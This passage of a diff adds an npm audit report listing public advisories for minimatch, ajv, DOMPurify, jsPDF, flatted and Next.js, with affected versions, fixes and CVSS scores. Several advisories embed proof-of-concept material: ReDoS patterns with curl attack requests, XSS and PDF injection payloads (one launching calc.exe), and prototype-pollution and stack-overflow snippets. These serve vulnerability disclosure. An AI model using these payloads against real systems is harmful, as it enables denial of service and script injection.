 const ms = Number(process.hrtime.bigint() - s) / 1e6\n  return { ms, result, error }\n}\n\n// Verify generated regexps\nfor (let depth = 1; depth <= 4; depth++) {\n  let pat = 'a|b'\n  for (let i = 0; i < depth; i++) pat = `*(${pat})`\n  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()\n  console.log(`depth=${depth} \"${pat}\" -> ${re}`)\n}\n// depth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\n// depth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\n// depth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\n// depth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\n// Safe-length timing (exponential growth confirmation without multi-minute hang)\nconst cases = [\n  ['*(*(*(a|b)))', 15],   // ~270ms\n  ['*(*(*(a|b)))', 17],   // ~800ms\n  ['*(*(*(a|b)))', 19],   // ~2400ms\n  ['*(*(a|b))',    23],   // ~260ms\n  ['*(a|b)',      101],   // <5ms (depth=1 control)\n]\nfor (const [pat, n] of cases) {\n  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))\n  console.log(`\"${pat}\" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)\n}\n\n// Confirm noext disables the vulnerability\nconst t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))\nconsole.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)\n\n// +() is equally affected\nconst t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))\nconsole.log(`\"+(+(+(a|b)))\" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)\n```\n\nObserved output:\n```\ndepth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\ndepth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\ndepth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\ndepth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\"*(*(*(a|b)))\" n=15: 269ms result=false\n\"*(*(*(a|b)))\" n=17: 268ms result=false\n\"*(*(*(a|b)))\" n=19: 2408ms result=false\n\"*(*(a|b))\"    n=23: 257ms result=false\n\"*(a|b)\"       n=101: 0ms result=false\nnoext=true: 0ms (should be ~0ms)\n\"+(+(+(a|b)))\" n=18: 6300ms result=false\n```\n\n**Step 2 -- HTTP server (event loop starvation proof)**\n\nSave as `poc4-server.mjs`:\n\n```javascript\nimport http from 'node:http'\nimport { URL } from 'node:url'\nimport { minimatch } from 'minimatch'\n\nconst PORT = 3001\nhttp.createServer((req, res) => {\n  const url     = new URL(req.url, `http://localhost:${PORT}`)\n  const pattern = url.searchParams.get('pattern') ?? ''\n  const path    = url.searchParams.get('path') ?? ''\n\n  const start  = process.hrtime.bigint()\n  const result = minimatch(path, pattern)\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\n  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=\"${pattern}\" path=\"${path.slice(0,30)}\"`)\n  res.writeHead(200, { 'Content-Type': 'application/json' })\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n}).listen(PORT, () => console.log(`listening on ${PORT}`))\n```\n\nTerminal 1 -- start the server:\n```\nnode poc4-server.mjs\n```\n\nTerminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:\n```\ncurl \"http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz\" &\n```\n\nTerminal 3 -- send a benign request while the attack is in-flight:\n```\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz\"\n```\n\n**Observed output -- Terminal 2 (attack):**\n```\n{\"result\":false,\"ms\":\"64149\"}\n```\n\n**Observed output -- Terminal 3 (benign, concurrent):**\n```\n{\"result\":false,\"ms\":\"0\"}\n\ntime_total: 63.022047s\n```\n\n**Terminal 1 (server log):**\n```\n[2026-02-20T09:41:17.624Z] pattern=\"*(*(*(a|b)))\" path=\"aaaaaaaaaaaaaaaaaaaz\"\n[2026-02-20T09:42:21.775Z] done in 64149ms result=false\n[2026-02-20T09:42:21.779Z] pattern=\"*(a|b)\" path=\"aaaz\"\n[2026-02-20T09:42:21.779Z] done in 0ms result=false\n```\n\nThe server reports `\"ms\":\"0\"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.\n\nNote: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.\n\n---\n\n### Impact\n\nAny context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.\n\nDepth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.\n\n`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).\n\n**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.",
+      "reported_by": null,
+      "title": "minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27904"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": ">=9.0.0 <9.0.7",
+      "github_advisory_id": "GHSA-23c5-xmqv-rm74",
+      "recommendation": "Upgrade to version 9.0.7 or later",
+      "patched_versions": ">=9.0.7",
+      "updated": "2026-02-26T22:07:15.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-23c5-xmqv-rm74"
+    },
+    "1113714": {
+      "findings": [
+        {
+          "version": "6.12.6",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-69873\n- https://github.com/EthanKim88/ethan-cve-disclosures/blob/main/CVE-2025-69873-ajv-ReDoS.md\n- https://github.com/ajv-validator/ajv/pull/2586\n- https://github.com/ajv-validator/ajv/commit/720a23fa453ffae8340e92c9b0fe886c54cfe0d5\n- https://github.com/ajv-validator/ajv/releases/tag/v8.18.0\n- https://github.com/ajv-validator/ajv/pull/2588\n- https://github.com/ajv-validator/ajv/releases/tag/v6.14.0\n- https://github.com/advisories/GHSA-2g4f-4pwh-qvx6\n- https://github.com/ajv-validator/ajv/pull/2590\n- https://github.com/github/advisory-database/pull/6991",
+      "created": "2026-02-11T21:30:39.000Z",
+      "id": 1113714,
+      "npm_advisory_id": null,
+      "overview": "ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\\\"^(a|a)*$\\\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",
+      "reported_by": null,
+      "title": "ajv has ReDoS when using `$data` option",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-69873"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ajv",
+      "vulnerable_versions": "<6.14.0",
+      "github_advisory_id": "GHSA-2g4f-4pwh-qvx6",
+      "recommendation": "Upgrade to version 6.14.0 or later",
+      "patched_versions": ">=6.14.0",
+      "updated": "2026-03-02T21:58:41.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-2g4f-4pwh-qvx6"
+    },
+    "1114017": {
+      "findings": [
+        {
+          "version": "3.3.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-0540\n- https://github.com/cure53/DOMPurify/commit/fca0a938b4261ddc9c0293a289935a9029c049f5\n- https://github.com/cure53/DOMPurify\n- https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safeforxml\n- https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safe-for-xml\n- https://github.com/advisories/GHSA-v2wj-7wpq-c8vv",
+      "created": "2026-03-03T18:31:33.000Z",
+      "id": 1114017,
+      "npm_advisory_id": null,
+      "overview": "DOMPurify 3.1.3 through 3.3.1 and 2.5.3 through 2.5.8, fixed in 2.5.9 and 3.3.2, contain a cross-site scripting vulnerability that allows attackers to bypass attribute sanitization by exploiting five missing rawtext elements (noscript, xmp, noembed, noframes, iframe) in the `SAFE_FOR_XML` regex. Attackers can include payloads like `</noscript><img src=x onerror=alert(1)>` in attribute values to execute JavaScript when sanitized output is placed inside these unprotected rawtext contexts.",
+      "reported_by": null,
+      "title": "DOMPurify contains a Cross-site Scripting vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-0540"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": ">=3.1.3 <=3.3.1",
+      "github_advisory_id": "GHSA-v2wj-7wpq-c8vv",
+      "recommendation": "Upgrade to version 3.3.2 or later",
+      "patched_versions": ">=3.3.2",
+      "updated": "2026-03-05T20:25:13.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-v2wj-7wpq-c8vv"
+    },
+    "1114396": {
+      "findings": [
+        {
+          "version": "4.0.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-p5xg-68wr-hm3m\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25940\n- https://github.com/parallax/jsPDF/commit/71ad2dbfa6c7c189ab42b855b782620fa8a38375\n- https://github.com/parallax/jsPDF/releases/tag/v4.2.0\n- https://github.com/advisories/GHSA-p5xg-68wr-hm3m",
+      "created": "2026-02-19T19:32:48.000Z",
+      "id": 1114396,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUser control of properties and methods of the Acroform module allows users to inject arbitrary PDF objects, such as JavaScript actions.\n\nIf given the possibility to pass unsanitized input to the following property, a user can inject arbitrary PDF objects, such as JavaScript actions, which are executed when the victim hovers over the radio option.\n\n* `AcroformChildClass.appearanceState`\n\nExample attack vector:\n\n```js\nimport { jsPDF } from \"jspdf\"\nconst doc = new jsPDF();\n\nconst group = new doc.AcroFormRadioButton();\ngroup.x = 10; group.y = 10; group.width = 20; group.height = 10;\ndoc.addField(group);\n\nconst child = group.createOption(\"opt1\");\nchild.x = 10; child.y = 10; child.width = 20; child.height = 10;\nchild.appearanceState = \"Off /AA << /E << /S /JavaScript /JS (app.alert('XSS')) >> >>\";\n\ndoc.save(\"test.pdf\");\n```\n\n### Patches\n\nThe vulnerability has been fixed in jsPDF@4.2.0.\n\n### Workarounds\nSanitize user input before passing it to the vulnerable API members.",
+      "reported_by": null,
+      "title": "jsPDF has a PDF Injection in AcroForm module allows Arbitrary JavaScript Execution (RadioButton.createOption and \"AS\" property)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-25940"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<4.2.0",
+      "github_advisory_id": "GHSA-p5xg-68wr-hm3m",
+      "recommendation": "Upgrade to version 4.2.0 or later",
+      "patched_versions": ">=4.2.0",
+      "updated": "2026-03-11T20:34:00.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-p5xg-68wr-hm3m"
+    },
+    "1114526": {
+      "findings": [
+        {
+          "version": "3.3.3",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/WebReflection/flatted/security/advisories/GHSA-25h7-pfq9-p65f\n- https://nvd.nist.gov/vuln/detail/CVE-2026-32141\n- https://github.com/WebReflection/flatted/pull/88\n- https://github.com/WebReflection/flatted/commit/7eb65d857e1a40de11c47461cdbc8541449f0606\n- https://github.com/advisories/GHSA-25h7-pfq9-p65f",
+      "created": "2026-03-13T15:40:42.000Z",
+      "id": 1114526,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nflatted's `parse()` function uses a recursive `revive()` phase to resolve circular references in deserialized JSON. When given a crafted payload with deeply nested or self-referential `$` indices, the recursion depth is unbounded, causing a stack overflow that crashes the Node.js process.\n\n## Impact\n\nDenial of Service (DoS). Any application that passes untrusted input to `flatted.parse()` can be crashed by an unauthenticated attacker with a single request.\n\nflatted has ~87M weekly npm downloads and is used as the circular-JSON serialization layer in many caching and logging libraries.\n\n## Proof of Concept\n\n```javascript\nconst flatted = require('flatted');\n\n// Build deeply nested circular reference chain\nconst depth = 20000;\nconst arr = new Array(depth + 1);\narr[0] = '{\"a\":\"1\"}';\nfor (let i = 1; i <= depth; i++) {\n  arr[i] = `{\"a\":\"${i + 1}\"}`;\n}\narr[depth] = '{\"a\":\"leaf\"}';\n\nconst payload = JSON.stringify(arr);\nflatted.parse(payload); // RangeError: Maximum call stack size exceeded\n```\n\n## Fix\n\nThe maintainer has already merged an iterative (non-recursive) implementation in PR #88, converting the recursive `revive()` to a stack-based loop.\n\n## Affected Versions\n\nAll versions prior to the PR #88 fix.",
+      "reported_by": null,
+      "title": "flatted vulnerable to unbounded recursion DoS in parse() revive phase",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-32141"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "flatted",
+      "vulnerable_versions": "<3.4.0",
+      "github_advisory_id": "GHSA-25h7-pfq9-p65f",
+      "recommendation": "Upgrade to version 3.4.0 or later",
+      "patched_versions": ">=3.4.0",
+      "updated": "2026-03-13T15:40:44.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-25h7-pfq9-p65f"
+    },
+    "1114897": {
+      "findings": [
+        {
+          "version": "15.5.9",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-ggv3-7p47-pfv8\n- https://github.com/vercel/next.js/commit/dc98c04f376c6a1df76ec3e0a2d07edf4abdabd6\n- https://github.com/vercel/next.js/releases/tag/v15.5.13\n- https://github.com/vercel/next.js/releases/tag/v16.1.7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-29057\n- https://github.com/advisories/GHSA-ggv3-7p47-pfv8",
+      "created": "2026-03-17T16:17:15.000Z",
+      "id": 1114897,
+      "npm_advisory_id": null,
+      "overview": "## Summary\nWhen Next.js rewrites proxy traffic to an external backend, a crafted `DELETE`/`OPTIONS` request using `Transfer-Encoding: chunked` could trigger request boundary disagreement between the proxy and backend. This could allow request smuggling through rewritten routes.\n\n## Impact\nAn attacker could smuggle a second request to unintended backend routes (for example, internal/admin endpoints), bypassing assumptions that only the configured rewrite destination/path is reachable. This does not impact applications hosted on providers that handle rewrites at the CDN level, such as Vercel. \n\n## Patches\nThe vulnerability originated in an upstream library vendored by Next.js. It is fixed by updating that dependency’s behavior so `content-length: 0` is added only when both `content-length` and `transfer-encoding` are absent, and `transfer-encoding` is no longer removed in that code path.\n\n## Workarounds\nIf upgrade is not immediately possible:\n- Block chunked `DELETE`/`OPTIONS` requests on rewritten routes at your edge/proxy.\n- Enforce authentication/authorization on backend routes per our [security guidance](https://nextjs.org/docs/app/guides/data-security).",
+      "reported_by": null,
+      "title": "Next.js: HTTP request smuggling in rewrites",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-29057"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=9.5.0 <15.5.13",
+      "github_advisory_id": "GHSA-ggv3-7p47-pfv8",
+      "recommendation": "Upgrade to version 15.5.13 or later",
+      "patched_versions": ">=15.5.13",
+      "updated": "2026-03-18T21:53:30.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-444"
+      ],
+      "url": "https://github.com/advisories/GHSA-ggv3-7p47-pfv8"
+    },
+    "1114934": {
+      "findings": [
+        {
+          "version": "3.3.3",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/WebReflection/flatted/security/advisories/GHSA-rf6f-7fwh-wjgh\n- https://github.com/advisories/GHSA-rf6f-7fwh-wjgh",
+      "created": "2026-03-19T17:43:54.000Z",
+      "id": 1114934,
+      "npm_advisory_id": null,
+      "overview": "---\n  **Summary**\n\n  The parse() function in flatted can use attacker-controlled string values from the parsed JSON as direct array index\n  keys, without validating that they are numeric. Since the internal input buffer is a JavaScript Array, accessing it\n  with the key \"\\_\\_proto\\_\\_\" returns Array.prototype via the inherited getter. This object is then treated as a legitimate\n   parsed value and assigned as a property of the output object, effectively leaking a live reference to Array.prototype\n   to the consumer. Any code that subsequently writes to that property will pollute the global prototype.\n\n  ---\n  **Root Cause**\n\n  File: esm/index.js:29 (identical in cjs/index.js)\n```\n  const resolver = (input, lazy, parsed, $) => output => {\n    for (let ke = keys(output), {length} = ke, y = 0; y < length; y++) {\n      const k = ke[y];\n      const value = output[k];    \n      if (value instanceof Primitive) {\n        const tmp = input[value];      // Bug is here\n```\n\nNo validation that value is a safe numeric index input is built as a plain Array. JavaScript's property lookup on arrays traverses the prototype chain for non-numeric  keys. The key \"\\_\\_proto\\_\\_\" resolves to Array.prototype, which:\n\n  - has type \"object\" → passes the typeof tmp === object guard at line 30\n  - is not in the parsed Set yet → passes the !parsed.has(tmp) guard.\n  - The reference to Array.prototype is then enqueued in lazy and later unconditionally assigned to the output object.\n  ---\n  **Replication Steps**\n```\n  const Flatted = require('flatted'); \n  const parsed = Flatted.parse('[{\"x\":\"__proto__\"}]');\n  parsed.x.polluted = 'pwned';\n  console.log([].polluted);  // Returns true\n``` \n ---\n  **Impact**\n An attacker can supply a crafted flatted string to parse() that causes the returned object to hold a live reference to Array.prototype, enabling any downstream code that writes to that property to pollute the global prototype chain, potentially causing denial of service or code execution.\n\n  **Recommended solution**\n Validate that the index string represents an integer within the bounds of input before accessing it:\n\n  // Before (vulnerable)\n  const tmp = input[value];\n\n  // After (safe)\n  const idx = +value;  // coerce boxed String → number\n  const tmp = (Number.isInteger(idx) && idx >= 0 && idx < input.length)\n    ? input[idx]\n    : undefined;",
+      "reported_by": null,
+      "title": "Prototype Pollution via parse() in NodeJS flatted",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33228"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "flatted",
+      "vulnerable_versions": "<=3.4.1",
+      "github_advisory_id": "GHSA-rf6f-7fwh-wjgh",
+      "recommendation": "Upgrade to version 3.4.2 or later",
+      "patched_versions": ">=3.4.2",
+      "updated": "2026-03-19T17:43:55.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-rf6f-7fwh-wjgh"
+    },
+    "1114940": {
+      "findings": [
+        {
+          "version": "15.5.9",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-3x4c-7xq6-9pq8\n- https://github.com/vercel/next.js/commit/39eb8e0ac498b48855a0430fbf4c22276a73b4bd\n- https://github.com/vercel/next.js/releases/tag/v16.1.7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27980\n- https://github.com/advisories/GHSA-3x4c-7xq6-9pq8",
+      "created": "2026-03-17T16:17:06.000Z",
+      "id": 1114940,
+      "npm_advisory_id": null,
+      "overview": "## Summary\nThe default Next.js image optimization disk cache (`/_next/image`) did not have a configurable upper bound, allowing unbounded cache growth.\n\n## Impact\nAn attacker could generate many unique image-optimization variants and exhaust disk space, causing denial of service. Note that this does not impact platforms that have their own image optimization capabilities, such as Vercel.\n\n## Patches\nFixed by adding an LRU-backed disk cache with `images.maximumDiskCacheSize`, including eviction of least-recently-used entries when the limit is exceeded. Setting `maximumDiskCacheSize: 0` disables disk caching. \n\n## Workarounds\nIf upgrade is not immediately possible:\n- Periodically clean `.next/cache/images`.\n- Reduce variant cardinality (e.g., tighten values for `images.localPatterns`, `images.remotePatterns`, and `images.qualities`)",
+      "reported_by": null,
+      "title": "Next.js: Unbounded next/image disk cache growth can exhaust storage",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27980"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=10.0.0 <15.5.14",
+      "github_advisory_id": "GHSA-3x4c-7xq6-9pq8",
+      "recommendation": "Upgrade to version 15.5.14 or later",
+      "patched_versions": ">=15.5.14",
+      "updated": "2026-03-19T18:33:25.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-3x4c-7xq6-9pq8"
+    },
+    "1114950": {
+      "findings": [
+        {
+          "version": "4.0.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-7x6v-j9x4-qf24\n- https://github.com/parallax/jsPDF/commit/4155c4819d5eca284168e51e0e1e81126b4f14b8\n- https://github.com/parallax/jsPDF/releases/tag/v4.2.1\n- https://nvd.nist.gov/vuln/detail/CVE-2026-31898\n- https://github.com/parallax/jsPDF/blob/b1607a9391d4cd65ea7ade25998aea8345ae1be3/src/modules/annotations.js#L193-L208\n- https://github.com/advisories/GHSA-7x6v-j9x4-qf24",
+      "created": "2026-03-17T17:07:51.000Z",
+      "id": 1114950,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUser control of arguments of the `createAnnotation` method allows users to inject arbitrary PDF objects, such as JavaScript actions.\n\nIf given the possibility to pass unsanitized input to the following method, a user can inject arbitrary PDF objects, such as JavaScript actions, which might trigger when the PDF is opened or interacted with..\n\n* `createAnnotation`: `color` parameter\n\nExample attack vector:\n\n```js\nimport { jsPDF } from 'jspdf'\n\nconst doc = new jsPDF();\n\nconst payload = '000000) /AA <</E <</S /Launch /F (calc.exe)>>>> (';\n\ndoc.createAnnotation({\n  type: 'freetext',\n  bounds: { x: 10, y: 10, w: 120, h: 20 },\n  contents: 'hello',\n  color: payload\n});\n\ndoc.save('test.pdf');\n```\n\n### Patches\n\nThe vulnerability has been fixed in jsPDF@4.2.1.\n\n### Workarounds\nSanitize user input before passing it to the vulnerable API members.",
+      "reported_by": null,
+      "title": "jsPDF has a PDF Object Injection via FreeText color",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-31898"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<=4.2.0",
+      "github_advisory_id": "GHSA-7x6v-j9x4-qf24",
+      "recommendation": "Upgrade to version 4.2.1 or later",
+      "patched_versions": ">=4.2.1",
+      "updated": "2026-03-19T19:01:36.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-7x6v-j9x4-qf24"
+    },
+    "1114974": {
+      "findings": [
+        {
+          "version": "4.0.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-wfv2-pwc8-crg5\n- https://github.com/parallax/jsPDF/commit/87a40bbd07e6b30575196370670b41f264aa78d7\n- https://github.com/parallax/jsPDF/releases/tag/v4.2.1\n- https://nvd.nist.gov/vuln/detail/CVE-2026-31938\n- https://github.com/advisories/GHSA-wfv2-pwc8-crg5",
+      "created": "2026-03-17T17:07:59.000Z",
+      "id": 1114974,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUser control of the `options` argument of the `output` function allows attackers to inject arbitrary HTML (such as scripts) into the browser context the created PDF is opened in. The affected overloads and options are:\n\n* `\"pdfobjectnewwindow\"`: the `pdfObjectUrl` option and the entire options object, which is JSON-serialized and included verbatim in the generated HTML-string.\n* `\"pdfjsnewwindow\"`: the `pdfJsUrl` and `filename` options\n* `\"dataurlnewwindow\"`: the `filename` option\n\nThe vulnerability can be exploited in the following scenario: the attacker provides values for the output options, for example via a web interface. These values are then passed unsanitized (automatically or semi-automatically) to the attack victim. The victim creates and opens a PDF with the attack vector using one of the vulnerable method overloads inside their browser. The attacker can thus inject scripts that run in the victims browser context and can extract or modify secrets from this context.\n\nExample attack vector:\n\n```js\nimport { jsPDF } from 'jspdf';\nconst doc = new jsPDF();\n\nconst payload =  'x\\\"></iframe><script>window.__n=1</script><iframe src=\"';\n\ndoc.output('pdfjsnewwindow', {\n  filename: payload,\n  pdfJsUrl: 'viewer.html'\n});\n```\n\n### Patches\nThe vulnerability has been fixed in jspdf@4.2.1.\n\n### Workarounds\nSanitize user input before passing it to the output method.",
+      "reported_by": null,
+      "title": "jsPDF has HTML Injection in New Window paths",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-31938"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "jspdf",
+      "vulnerable_versions": "<=4.2.0",
+      "github_advisory_id": "GHSA-wfv2-pwc8-crg5",
+      "recommendation": "Upgrade to version 4.2.1 or later",
+      "patched_versions": ">=4.2.1",
+      "updated": "2026-03-19T21:00:35.000Z",
+      "cvss": {
+        "score": 9.6,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-wfv2-pwc8-crg5"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 9,
+      "high": 15,
+      "critical": 1
+    },
+    "dependencies": 897,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 897
+  }
+}
